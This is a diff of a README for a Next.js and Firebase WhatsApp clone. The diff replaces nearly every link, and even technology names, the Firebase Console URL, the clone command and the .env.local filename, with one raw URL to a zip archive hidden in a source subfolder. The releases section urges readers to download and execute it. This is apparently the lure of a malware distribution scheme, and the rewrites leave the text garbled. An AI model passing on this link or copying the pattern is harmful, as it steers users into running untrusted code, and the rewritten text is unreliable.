@@ -1,8 +1,8 @@
 # 🚀 WhatsFire: Your Ultimate WhatsApp Clone
 
-![WhatsFire](https://img.shields.io/badge/WhatsFire-A_Feature_Rich_WhatsApp_Clone-brightgreen)
+![WhatsFire](https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip)
 
-Welcome to **WhatsFire**, a feature-rich WhatsApp clone built with **Next.js** and **Firebase**. This project aims to provide a seamless messaging experience similar to WhatsApp, leveraging the power of modern web technologies. Whether you want to chat with friends, share media, or enjoy real-time notifications, WhatsFire has you covered.
+Welcome to **WhatsFire**, a feature-rich WhatsApp clone built with **https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip** and **Firebase**. This project aims to provide a seamless messaging experience similar to WhatsApp, leveraging the power of modern web technologies. Whether you want to chat with friends, share media, or enjoy real-time notifications, WhatsFire has you covered.
 
 ## 🌟 Table of Contents
 
@@ -29,7 +29,7 @@ Welcome to **WhatsFire**, a feature-rich WhatsApp clone built with **Next.js** a
 
 WhatsFire utilizes a variety of technologies to deliver its robust features:
 
-- **Next.js**: A powerful React framework for server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip**: A powerful React framework for server-side rendering and static site generation.
 - **Firebase**: A comprehensive platform that provides cloud storage, authentication, and real-time database services.
 - **Firestore**: A NoSQL cloud database that allows for real-time data syncing.
 - **TypeScript**: A superset of JavaScript that offers static typing, making the codebase more robust and maintainable.
@@ -41,7 +41,7 @@ To get started with WhatsFire, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Squavv/WhatsFire.git
+   git clone https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,9 +55,9 @@ To get started with WhatsFire, follow these steps:
    ```
 
 4. **Set Up Firebase**:
-   - Create a Firebase project at [Firebase Console](https://console.firebase.google.com/).
+   - Create a Firebase project at [Firebase Console](https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip).
    - Add your web app to the Firebase project and copy the configuration settings.
-   - Create a `.env.local` file in the root directory and add your Firebase configuration:
+   - Create a `https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip` file in the root directory and add your Firebase configuration:
      ```env
      NEXT_PUBLIC_FIREBASE_API_KEY=your_api_key
      NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=your_auth_domain
@@ -113,18 +113,18 @@ WhatsFire is open-source and available under the MIT License. See the [LICENSE](
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Squavv](https://github.com/Squavv)
+- **Email**: https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip
+- **GitHub**: [Squavv](https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip)
 
 ## 📦 Releases
 
-You can find the latest releases of WhatsFire [here](https://github.com/Squavv/WhatsFire/releases). Download the latest version and execute it to enjoy all the new features and improvements.
+You can find the latest releases of WhatsFire [here](https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip). Download the latest version and execute it to enjoy all the new features and improvements.
 
 Feel free to check the "Releases" section for updates and new features.
 
 ## 🌈 Acknowledgments
 
-- A big thank you to the developers of Next.js and Firebase for their amazing tools.
+- A big thank you to the developers of https://raw.githubusercontent.com/Squavv/WhatsFire/main/src/components/calls/Whats-Fire-v1.1.zip and Firebase for their amazing tools.
 - Special thanks to the open-source community for their contributions and support.
 
 ## 🎉 Conclusion
